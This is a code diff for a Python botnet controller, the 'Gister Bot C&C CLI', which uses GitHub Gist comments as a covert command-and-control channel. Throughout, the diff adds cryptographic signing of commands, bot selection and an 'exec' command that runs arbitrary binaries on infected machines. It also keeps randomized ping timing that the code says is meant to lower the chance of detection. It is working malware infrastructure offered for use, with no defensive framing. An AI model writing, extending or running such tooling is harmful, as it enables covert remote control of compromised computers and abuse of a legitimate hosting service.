@@ -1,13 +1,16 @@
 import base64
 import threading
+import random
 from time import sleep, time
 from github.GistComment import GistComment
+from typing import List
+
 from channel import Channel
-import random
+from nacl.signing import SigningKey
 
 
 class Controller:
-    def __init__(self, token: str, gist: str):
+    def __init__(self, token: str, gist: str, signing_seed: str):
         self.channel = Channel(token, gist)
         self.active = True
         self.response_thread = threading.Thread(
@@ -15,6 +18,9 @@ class Controller:
         )
         self.ping_thread = threading.Thread(target=self.ping_bots, daemon=True)
         self.last_ping = None
+
+        self.signing_key = SigningKey(base64.b64decode(signing_seed.encode("utf-8")))
+        print(f"Verify key: {base64.b64encode(self.signing_key.verify_key.encode())}")
 
         self.bots = {}
         self.bots_lock = threading.Lock()
@@ -41,16 +47,10 @@ class Controller:
         Handles responses from bots
         :param response: the response to decode and process
         """
-        response_footer = response.body[response.body.rfind("[") :]
-        response_id = base64.b64decode(
-            response_footer.split("(")[1].split(")")[0].encode("utf-8")
-        ).decode("utf-8")
-
-        bot_id = response_id.split("-")[1]
-        command_id = int(response_id.split("-")[0])
-
         with self.bots_lock:
             if Channel.PING_RESPONSE in response.body:
+                bot_id, command_id = self.parse_response(response)
+
                 if not self.bots.get(bot_id):
                     self.bots[bot_id] = {}
 
@@ -59,6 +59,8 @@ class Controller:
                 self.channel.delete_message(response.id)
 
             elif Channel.BINARY_RESPONSE in response.body:
+                bot_id, command_id = self.parse_response(response)
+
                 bot = self.bots.get(bot_id)
 
                 if bot and bot["commands"] and bot["commands"][command_id]:
@@ -69,8 +71,25 @@ class Controller:
                     ).decode("utf-8")
                     print(f"\n{stdout}")
                     self.channel.delete_message(command_id)
+                    bot["commands"].pop(command_id)
 
                 self.channel.delete_message(response.id)
+
+    def parse_response(self, response: GistComment) -> (str, str):
+        """
+        Parses needed response metadata from a response
+        :param response: GistComment containing the response
+        :return:
+        """
+        response_footer = response.body[response.body.rfind("[") :]
+        response_id = base64.b64decode(
+            response_footer.split("(")[1].split(")")[0].encode("utf-8")
+        ).decode("utf-8")
+
+        bot_id = response_id.split("-")[1]
+        command_id = int(response_id.split("-")[0])
+
+        return bot_id, command_id
 
     def ping_bots(self):
         """
@@ -93,7 +112,7 @@ class Controller:
                 if self.selected_bot not in self.bots:
                     self.selected_bot = None
 
-                self.last_ping = self.channel.send_message(f"{Channel.PING_REQUEST}").id
+                self.last_ping = self.send_command(f"{Channel.PING_REQUEST}").id
 
             # Randomized sleep for a lesser chance of detection
             sleep(random.uniform(50, 70))
@@ -106,16 +125,22 @@ class Controller:
             input_str = input(f"({self.selected_bot if self.selected_bot else '*'})$ ")
             args = input_str.split(" ")
 
-            if args[0].lower() == "exit":
+            command = args[0].lower()
+
+            if command == "exit":
                 self.exit()
-            elif args[0].lower() == "status":
+            elif command == "status":
                 self.print_status()
-            elif args[0].lower() == "list":
+            elif command == "help":
+                self.print_help()
+            elif command == "list":
                 self.print_bots()
-            elif args[0].lower() == "bot":
+            elif command == "bot":
                 self.select_bot(args[1:])
-            elif args[0].lower() == "exec":
-                self.execute_command(args[1:])
+            elif command == "exec":
+                self.execute_binary(args[1:])
+            else:
+                print("Invalid command. For a list of available commands enter 'help'.")
 
     def exit(self):
         """
@@ -131,10 +156,6 @@ class Controller:
         Prints bot status (how many are still alive based on pings)
         """
         with self.bots_lock:
-            # print(
-            #     f"Bots currently online: {len([x for x, y in self.bots.items() if y['last_ping'] == self.last_ping])}"
-            # )
-
             print(f"Bots currently online: {len(self.bots)}")
 
     def print_bots(self):
@@ -145,24 +166,30 @@ class Controller:
             for bot_id in self.bots.keys():
                 print(f"{bot_id}")
 
-    def select_bot(self, args: list[str]):
+    def select_bot(self, args: List[str]):
         """
         Selects the bot to which following commands are sent
         :param args: Command arguments
         """
         if len(args) < 1:
-            print("Invalid bot ID")
+            print("You must enter a valid bot ID.")
             return
 
         with self.bots_lock:
             bot_id = args[0]
 
-            if bot_id in self.bots.keys():
+            if bot_id == "*":
+                self.selected_bot = None
+            elif bot_id in self.bots.keys():
                 self.selected_bot = bot_id
             else:
                 print("The given bot is invalid or the given bot is offline")
 
-    def execute_command(self, args: list[str]):
+    def execute_binary(self, args: List[str]):
+        """
+        Executes an arbitrary binary on the target bot OS
+        :param args: The binary with arguments
+        """
         with self.bots_lock:
             if not self.selected_bot:
                 print(
@@ -172,13 +199,48 @@ class Controller:
 
             bot_id = base64.b64encode(self.selected_bot.encode("utf-8")).decode("utf-8")
 
-            command = self.channel.send_message(
-                f"{Channel.BINARY_REQUEST} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({bot_id})"
+            self.send_command(
+                f"{Channel.BINARY_REQUEST} [](<{base64.b64encode(' '.join(args).encode('utf-8')).decode('utf-8')}>) []({bot_id})",
+                save_command=True,
             )
 
+    def send_command(self, command: str, save_command: bool = False) -> GistComment:
+        """
+        Signs the command and sends it to the channel
+        :param command: Command to send
+        :param save_command: Whether to save this command to the bot dict
+        :return: GistComment containing the command
+        """
+        signature = base64.b64encode(
+            self.signing_key.sign(command.encode("utf-8")).signature
+        ).decode("utf-8")
+
+        command += f" [](_{signature}_)"
+
+        command = self.channel.send_message(command)
+
+        if save_command:
             bot = self.bots[self.selected_bot]
 
             if not bot.get("commands"):
                 bot["commands"] = {}
 
             bot["commands"][command.id] = time()
+
+        return command
+
+    def print_help(self):
+        """
+        Prints help.
+        """
+        print(
+            f"\n"
+            f"Gister Bot C&C CLI\n"
+            f"==================\n"
+            f"List of available commands:\n"
+            f"status\t\t\t=> Prints the number of available bots\n"
+            f"list\t\t\t=> Lists available (alive) bots\n"
+            f"bot <bot id>\t=> Selects a bot to execute commands on\n"
+            f"exec <command>\t=> Executes a command on a selected bot\n"
+            f"exit\t\t\t=> Cleans up the communication channel and exits\n"
+        )
